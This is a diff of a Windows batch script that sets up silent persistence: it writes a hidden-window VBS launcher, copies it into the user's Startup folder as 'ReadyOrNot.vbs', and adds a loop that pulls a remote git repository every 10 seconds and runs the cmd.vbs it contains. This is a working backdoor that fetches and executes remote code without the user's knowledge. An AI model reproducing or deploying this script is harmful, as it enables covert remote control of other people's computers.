@@ -1,7 +1,6 @@
 @echo off
 :: Variables for paths and repo URL
 set "SCRIPTS_DIR=%userprofile%\Documents\Scripts"
-set "SYNC_BATCH=%SCRIPTS_DIR%\sync_repo.bat"
 set "VBS_FILE=%SCRIPTS_DIR%\silent_runner.vbs"
 set "CMD_VBS=%SCRIPTS_DIR%\cmd.vbs"
 set "STARTUP_VBS=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ReadyOrNot.vbs"
@@ -13,49 +12,39 @@ if not exist "%SCRIPTS_DIR%" (
     mkdir "%SCRIPTS_DIR%"
 )
 
-:: Step 1: Create sync_repo.bat that syncs the repo every 10 seconds and runs cmd.vbs
-@echo off > "%SYNC_BATCH%"
-setlocal >> "%SYNC_BATCH%"
-
-:: Set variables
-echo set "REPO_URL=%REPO_URL%" >> "%SYNC_BATCH%"
-echo set "DEST_DIR=%CLONE_DIR%" >> "%SYNC_BATCH%"
-echo set "CMD_VBS=%CMD_VBS%" >> "%SYNC_BATCH%"
-
-:: Loop for syncing
-echo :loop >> "%SYNC_BATCH%"
-echo if not exist "%%DEST_DIR%%" ( >> "%SYNC_BATCH%"
-echo ^    git clone %%REPO_URL%% %%DEST_DIR%% >> "%SYNC_BATCH%"
-echo ) else ( >> "%SYNC_BATCH%"
-echo ^    cd /d %%DEST_DIR%% >> "%SYNC_BATCH%"
-echo ^    git pull >> "%SYNC_BATCH%"
-
-:: Check if the git pull was successful
-echo ^    if !ERRORLEVEL! EQU 0 ( >> "%SYNC_BATCH%"
-:: Optionally, delete a specific file after successful pull (Uncomment if needed)
-::echo ^        del /q "%%DEST_DIR%%/sts.txt" >> "%SYNC_BATCH%"
-echo ^    ) >> "%SYNC_BATCH%"
-
-:: Run cmd.vbs script
-echo cscript //nologo %%CMD_VBS%% >> "%SYNC_BATCH%"
-
-echo ) >> "%SYNC_BATCH%"
-
-:: Wait and loop
-echo timeout /t 10 /nobreak >nul >> "%SYNC_BATCH%"  :: 10 seconds delay
-echo goto loop >> "%SYNC_BATCH%"
-
-echo endlocal >> "%SYNC_BATCH%"
-echo exit /b 0 >> "%SYNC_BATCH%"
-
-:: Step 2: Create silent_runner.vbs to run sync_repo.bat silently
+:: Step 1: Create silent_runner.vbs to run the sync process silently
 echo Set objShell = CreateObject("WScript.Shell") > "%VBS_FILE%"
-echo objShell.Run "cmd /c ""%SYNC_BATCH%""", 0, True >> "%VBS_FILE%"
+echo objShell.Run "cmd /c ""%~f0""", 0, True >> "%VBS_FILE%"
 
-:: Step 3: Copy VBS file to the startup folder
+:: Step 2: Copy VBS file to the startup folder
 copy "%VBS_FILE%" "%STARTUP_VBS%" /Y
 
-:: Step 4: Run the VBS file to start the sync process immediately (in the background)
-:: Optionally, start it right away without waiting for the user to restart
-::start "" wscript "%VBS_FILE%"
+:: Step 3: Start the Git sync and cmd.vbs execution loop
+setlocal
 
+:loop
+:: Clone or pull the repository
+if not exist "%CLONE_DIR%" (
+    git clone "%REPO_URL%" "%CLONE_DIR%"
+) else (
+    cd /d "%CLONE_DIR%"
+    git pull
+)
+
+:: Check if the git pull was successful
+if %ERRORLEVEL% EQU 0 (
+    rem Optionally delete a specific file after successful pull (uncomment if needed)
+    rem del /q "%CLONE_DIR%\sts.txt"
+)
+
+:: Run cmd.vbs script
+if exist "%CMD_VBS%" (
+    cscript //nologo "%CMD_VBS%"
+)
+
+:: Wait and loop
+timeout /t 10 /nobreak >nul
+goto loop
+
+endlocal
+exit /b 0
